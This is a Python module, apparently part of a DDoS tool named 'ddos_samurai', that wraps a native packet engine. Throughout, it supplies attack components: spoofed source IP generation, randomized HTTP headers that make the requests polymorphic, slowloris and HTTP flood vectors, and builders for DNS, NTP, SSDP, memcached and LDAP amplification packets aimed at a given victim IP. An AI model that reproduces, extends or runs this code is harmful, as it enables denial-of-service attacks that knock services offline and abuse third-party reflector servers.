"""Packet utilities backed by the native CPU packet engine.

This module keeps the historical import path ``ddos_samurai.packet`` while
routing packet construction to ``cpu_packet_engine``.
"""

from __future__ import annotations

from dataclasses import replace
from typing import Any, Dict, Optional

from . import cpu_packet_engine as _cpu

PacketConfig = _cpu.PacketConfig
SpoofingOptions = _cpu.SpoofingOptions
RawPacket = _cpu.RawPacket


def _generate_random_ip() -> str:
    return _cpu.generate_random_ip()


def _generate_realistic_ip() -> str:
    return _cpu.generate_realistic_ip()


def _generate_ip_from_subnet(subnet: str) -> str:
    return _cpu.generate_ip_from_subnet(subnet)


def _load_ips_from_file(file_path: str) -> list[str]:
    return list(_cpu.load_ips_from_file(file_path))


def get_spoofed_ip(
    spoof_mode: str,
    spoof_options: Optional[Dict[str, Any]] = None,
    *,
    subnet: Optional[str] = None,
    list_file: Optional[str] = None,
) -> str:
    opts = dict(spoof_options or {})
    eff_subnet = subnet if subnet is not None else opts.get("subnet")
    eff_list_file = list_file if list_file is not None else (opts.get("list_file") or opts.get("file_path"))
    return _cpu.get_spoofed_ip(mode=str(spoof_mode or "realistic"), subnet=eff_subnet, list_file=eff_list_file)


def add_padding(packet: Any, target_size: int) -> RawPacket:
    data = bytes(packet)
    target = int(target_size or 0)
    if len(data) < target:
        data = data + (b"\x00" * (target - len(data)))
    return RawPacket(data)


def _randomize_http_headers(
    target_ip: str,
    path: str = "/",
    method: str = "GET",
    user_agent: Optional[str] = None,
) -> bytes:
    import random

    ua = user_agent or (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )
    headers = [
        ("Host", target_ip),
        ("User-Agent", ua),
        ("Accept", "*/*"),
        ("Accept-Language", "en-US,en;q=0.5"),
        ("Accept-Encoding", "gzip, deflate, br"),
        ("Connection", "keep-alive"),
        ("Upgrade-Insecure-Requests", "1"),
        ("Cache-Control", "max-age=0"),
    ]
    random.shuffle(headers)
    rendered: list[str] = []
    for key, value in headers:
        if random.random() > 0.5:
            key = key.lower()
        rendered.append(f"{key}: {value}")
    line = f"{method} {path} HTTP/1.1"
    payload = line + "\r\n" + "\r\n".join(rendered) + "\r\n\r\n"
    return payload.encode("ascii", errors="ignore")


def create_polymorphic_packet(cfg: PacketConfig) -> RawPacket:
    data = _cpu.build_polymorphic_http_packet(cfg)
    return RawPacket(data)


def create_packet(cfg: PacketConfig) -> RawPacket:
    vector = str(getattr(cfg, "attack_vector", "basic") or "basic").strip().lower()
    if vector in {"http", "slowloris", "http2"}:
        cfg = replace(cfg, payload=_randomize_http_headers(cfg.target_ip))
    return RawPacket(_cpu.create_packet(cfg))


def create_dns_amp_packet(reflector_ip: str, victim_ip: str, dns_name: str = "isc.org") -> RawPacket:
    return RawPacket(_cpu.create_dns_amp_packet(reflector_ip, victim_ip, dns_name))


def create_ntp_amp_packet(reflector_ip: str, victim_ip: str) -> RawPacket:
    return RawPacket(_cpu.create_ntp_amp_packet(reflector_ip, victim_ip))


def create_ssdp_amp_packet(reflector_ip: str, victim_ip: str) -> RawPacket:
    return RawPacket(_cpu.create_ssdp_amp_packet(reflector_ip, victim_ip))


def create_memcached_amp_packet(reflector_ip: str, victim_ip: str) -> RawPacket:
    return RawPacket(_cpu.create_memcached_amp_packet(reflector_ip, victim_ip))


def create_ldap_amp_packet(reflector_ip: str, victim_ip: str) -> RawPacket:
    return RawPacket(_cpu.create_ldap_amp_packet(reflector_ip, victim_ip))


__all__ = [
    "PacketConfig",
    "SpoofingOptions",
    "RawPacket",
    "_generate_random_ip",
    "_generate_realistic_ip",
    "_generate_ip_from_subnet",
    "_load_ips_from_file",
    "get_spoofed_ip",
    "add_padding",
    "_randomize_http_headers",
    "create_polymorphic_packet",
    "create_packet",
    "create_dns_amp_packet",
    "create_ntp_amp_packet",
    "create_ssdp_amp_packet",
    "create_memcached_amp_packet",
    "create_ldap_amp_packet",
]

